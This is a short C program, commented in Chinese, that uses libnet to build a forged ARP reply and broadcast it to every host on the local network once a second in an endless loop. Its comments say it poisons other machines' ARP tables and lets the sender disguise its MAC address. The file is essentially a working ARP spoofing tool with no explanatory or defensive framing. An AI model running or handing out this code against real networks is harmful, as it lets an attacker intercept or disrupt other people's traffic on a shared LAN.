#include <stdio.h>
#include <libnet.h>
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
//向同一网络内所有机器发送ARP REPLY包，告诉他们，23.23.23.2Z在00:df:17:17:17:f2那里
#define true 1
int main(int argc, char *argv[])
{
    libnet_t *l = NULL; // libnet context
    char *device = "wlan0"; 
    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    unsigned char src_mac[MAC_ADDR_LEN]//自己机器的MAC地址,伪装成自己
          = {0xac, 0x72, 0x89, 0x3b, 0x53, 0x49};
    //    = {0x00, 0xdf, 0x17, 0x17, 0x17, 0xf2};
	//ac:72:89:3b:53:49
    unsigned char dest_mac[MAC_ADDR_LEN]
        = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    char *src_ip_str = "192.168.0.137";
    unsigned long src_ip, dest_ip = 0;
    src_ip = libnet_name2addr4(l, src_ip_str, LIBNET_RESOLVE);
    
    // create libnet environment

    l = libnet_init(LIBNET_LINK_ADV, device, err_buf);
    if(!l)
        printf("libnet_init error\n"), exit(1);
    //构造ARP数据包

    p_tag = libnet_build_arp( // construct arp packet
        ARPHRD_ETHER, // hardware type ethernet
        ETHERTYPE_IP, // protocol type
        MAC_ADDR_LEN, // mac length
        IP_ADDR_LEN, // protocol length
        ARPOP_REPLY, // op type
        (u_int8_t*)src_mac, // source mac addr这里作用是更新目的地的ARP表 IP-MAC
        (u_int8_t*)&src_ip, // source ip addr
        (u_int8_t*)dest_mac, // dest mac addr
        (u_int8_t*)&dest_ip, // dest ip addr
        NULL, // payload
        0, // payload length
        l, // libnet context
        0 //0 stands to build a new one
    );
    if(-1 == p_tag)
        printf("libnet_build_arp error\n"), exit(1);
    //以太网头部
    p_tag = libnet_build_ethernet( // create ethernet header
        (u_int8_t*)dest_mac, // dest mac addr
        (u_int8_t*)src_mac, // source mac addr这里说明你链路层的源MAC地址，如果改了可以伪装自己
        ETHERTYPE_ARP, // protocol type
     NULL, // payload
        0, // payload length
        l, // libnet context
        0 // 0 to build a new one
    );
    if(-1 == p_tag)
        printf("libnet_build_ethernet error!\n"), exit(1);
    int res;
	while(true){
		if(-1 == (res = libnet_write(l))){
			printf("libnet_write error!\n"),exit(1);
		}
		sleep(1);
	}
    libnet_destroy(l);
    return 0;
}
